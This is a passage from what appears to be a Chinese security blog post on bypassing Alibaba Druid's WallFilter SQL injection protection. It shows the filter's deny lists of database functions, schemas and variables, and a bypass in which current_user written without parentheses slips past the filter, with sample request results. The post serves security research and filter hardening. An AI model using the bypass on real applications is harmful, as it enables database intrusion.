+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-yml" data-lang="yml"><span class="line"><span class="cl"><span class="nt">deny-function</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="l">version</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="l">load_file</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="l">database</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="l">schema</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="l">user</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="l">system_user</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="l">session_user</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="l">benchmark</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="l">current_user</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="l">sleep</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="l">xmltype</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="l">receive_message</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">deny-schema</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="l">information_schema</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="l">mysql</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="l">performance_schema    </span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">deny-variant</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="l">basedir</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="l">version_compile_os</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="l">version</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="l">datadir</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>使用 其他函数的替换这些黑名单的函数</p>
+<p>这里 current_user 虽然在黑名单里，但是实际过程中还是能执行，这是一个bug。</p>
+<p>WallFilter 默认拦截的是函数，当执行 current_user()时会被拦截，但执行 current_user时就不会被拦截</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&amp;current_user()=1 ==&gt;
+</span></span><span class="line"><span class="cl">Error querying database.  Cause: java.sql.SQLException: sql injection violation, dbType mysql, druid-version 1.2.16, deny function : current_user 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">&amp;current_user=1 ==&gt;
+</span></span><span class="line"><span class="cl">成功返回</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="参考文献" class="heading-element"><span>参考文献</span>
+  <a href="#%e5%8f%82%e8%80%83%e6%96%87%e7%8c%ae" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><ul>
+<li><a href="https://m1r0ku.github.io/posts/Druid-WallFilter.html"target="_blank" rel="external nofollow noopener noreferrer">Druid WallFilter 绕过浅析</a></li>
+<li><a href="https://github.com/alibaba/druid/blob/master/core/src/main/resources/META-INF/druid/wall/mysql/deny-function.txt"target="_blank" rel="external nofollow noopener noreferrer">WallFilter 拦截函数</a></li>
+<li><a href="https://mp.weixin.qq.com/s/lGalf63VXCva2I5BpmSMgQ"target="_blank" rel="external nofollow noopener noreferrer">Druid拦截功能的配置与简单绕过</a></li>
+</ul>
+<h2 id="文件属性" class="heading-element"><span>文件属性</span>
+  <a href="#%e6%96%87%e4%bb%b6%e5%b1%9e%e6%80%a7" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>创建时间：2026-01-14   16:50</p>
+<p>修订记录：</p>
+<ul>
+<li>2026-01-14 ，此次修订内容| 新建</li>
+</ul>
+<p>备注：
+XXXXX</p></div><div class="post-footer" id="post-footer">
+  <div class="post-info">
+    <div class="post-info-line">
+      <div class="post-info-mod">
+        <span title="更新于 2026-01-14 10:18:19">更新于 2026-01-14&nbsp;</span>
+      </div></div><div class="post-info-line">
+        <div class="post-info-md"></div>
+        <div class="post-info-share">
+          <span></span>
+        </div>
+      </div></div>
+
+  <div class="post-info-more">
+    <section class="post-tags"><i class="fa-solid fa-tags fa-fw me-1" aria-hidden="true"></i><a href="/tags/sqli/" class="post-tag" title="标签 - SQLi">SQLi</a></section>
+    <section>
+      <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+    </section>
+  </div><div class="post-nav"><a href="/posts/cve-2025-55182_react2shell/" class="post-nav-item" rel="prev" title="CVE-2025-55182_React2Shell漏洞分析"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>CVE-2025-55182_React2Shell漏洞分析</a></div>
+</div>
+</article>
+
+  <aside class="toc" id="toc-auto" aria-label="目录"><h2 class="toc-title">目录&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
+      <div class="toc-content always-active" id="toc-content-auto"></div></aside></main><footer class="footer">
+    <div class="footer-container"><div class="footer-line visitor">
+          <span id="busuanzi_container_site_uv" title='总访客数'><i class="fa-regular fa-user fa-fw me-1" aria-hidden="true"></i><span id="busuanzi_value_site_uv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span><span id="busuanzi_container_site_pv" class="footer-divider" title='总访问量'><i class="fa-regular fa-eye fa-fw me-1" aria-hidden="true"></i><span id="busuanzi_value_site_pv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span>
+        </div></div>
+    <script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+      tex2jax: {
+        inlineMath: [['$','$'], ['\\(','\\)']],
+        processEscapes: true
+      }
+    });
+</script>
+
+<script src='https://cdn.jsdelivr.net/npm/mathjax@2.7.4/MathJax.js?config=TeX-AMS-MML_HTMLorMML' async></script>
+  </footer></div><div class="widgets"><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role="button" aria-label="回到顶部"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><span class="variant-numeric d-none">0%</span>
+        </div></div><div id="mask"></div><div class="reading-progress-bar" style="left: 0;top: 0;"></div><noscript>
+    <div class="noscript-warning">该网站在启用 JavaScript 的情况下效果最佳。</div>
+  </noscript>
+</div><link rel="stylesheet" href="/lib/lightgallery/css/lightgallery-bundle.min.css"><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><link rel="stylesheet" href="/lib/pace/themes/blue/pace-theme-minimal.css"><script src="/lib/autocomplete/autocomplete.min.js" defer></script><script src="/lib/fuse/fuse.min.js" defer></script><script src="/lib/twemoji/twemoji.min.js" defer></script><script src="/lib/lightgallery/lightgallery.min.js" defer></script><script src="/lib/lightgallery/plugins/thumbnail/lg-thumbnail.min.js" defer></script><script src="/lib/lightgallery/plugins/zoom/lg-zoom.min.js" defer></script><script src="/lib/cookieconsent/cookieconsent.min.js" defer></script><script src="/lib/pace/pace.min.js" async defer></script><script>window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":20},"comment":{"enable":false},"cookieconsent":{"content":{"dismiss":"同意","link":"了解更多","message":"本网站使用 Cookies 来改善您的浏览体验。"},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"lightgallery":true,"search":{"distance":100,"findAllMatches":false,"fuseIndexURL":"/search.json","highlightTag":"em","ignoreFieldNorm":false,"ignoreLocation":false,"isCaseSensitive":false,"location":0,"maxResultLength":10,"minMatchCharLength":2,"noResultsFound":"没有找到结果","snippetLength":30,"threshold":0.3,"type":"fuse","useExtendedSearch":false},"twemoji":true,"version":"v0.3.16"};console.log('Page config:', window.config);</script><script src="/js/theme.min.js" defer></script></body>
+</html>
